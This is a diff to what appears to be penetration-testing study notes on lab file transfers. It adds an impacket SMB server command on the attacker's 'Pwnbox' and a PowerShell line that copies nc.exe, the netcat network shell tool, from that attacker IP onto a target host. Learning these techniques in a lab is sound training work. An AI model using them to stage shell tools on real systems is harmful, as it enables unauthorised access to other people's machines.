@@ -140,5 +140,13 @@ We can use SMB to download files from our Pwnbox easily. We need to create an SM
 
 #### Create the SMB Server
 ```shell
-
+sudo impacket-smbserver share -smb2support /tmp/smbshare
 ```
+![](../../Attachements/Pasted%20image%2020260726130419.png)
+To download a file from the SMB server to the current working directory, we can use the following command:
+#### Copy a File from the SMB Server
+```powershell
+copy \\192.168.220.133\share\nc.exe
+```
+![](../../Attachements/Pasted%20image%2020260726130503.png)
+
